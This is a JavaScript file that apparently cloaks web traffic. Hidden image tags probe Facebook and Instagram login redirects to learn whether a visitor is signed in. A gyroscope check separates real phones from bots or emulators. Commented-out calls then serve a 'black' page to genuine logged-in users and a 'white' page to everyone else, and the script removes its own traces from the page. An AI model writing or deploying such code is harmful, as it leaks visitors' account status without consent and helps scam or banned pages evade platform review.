"use strict";

var counter = 0;

$(function(){
	window.addEventListener('deviceorientation', onOrientationChange);

	var arData = {
		facebook: {
			url: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico",
			name: "facebook"
		},

		instagram: {
			url: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico",
			name: "instagram"
		},
	};


	for (var key in arData) {
		var item = arData[key];
		var image = '<img class="icon-image" src="' + item.url + '" onload="refresh(\'' + item.name + '\')" onerror="error(\'' + item.name + '\')" style="display: none;" />';

		$("#include_data").append(image);
	} // for in


	$("#include_data").remove();
	$("#remove_script").remove();
});


function onOrientationChange(e) {
	var alpha = Math.round(e.alpha);
	var beta = Math.round(e.beta);
	var gamma = Math.round(e.gamma);

	showMessage("begin load system: giroscop");

	if((alpha || beta || gamma) && counter < 1){
		counter++;

		showMessage("end load system: giroscop");
		// document.location.href += "black_land";

		// $.post("php/worked_2_4.php", {request: "blackPage", state: "logged", system: "giroscop"}, function (data) {
		// 	$("#page_content").html(data);
		// });
	} // if
} // onOrientationChange


function refresh(system) {
	showMessage("refresh load system: " + system);

	// document.location.href += "black_land";

	// $.post("php/worked_2_4.php", {request: "blackPage", state: "logged", system: system}, function (data) {
	// 	$("#page_content").html(data);
	// });
} // refresh


function error(system) {
	showMessage("error system: " + system);

	// $.post("php/worked_2_4.php", {request: "whitePage", state: "not logged", system: system}, function (data) {
	// 	$("#page_content").html(data);
	// });
} // error


function showMessage(text){
	console.log(text);
	alert(text);
} // showMessage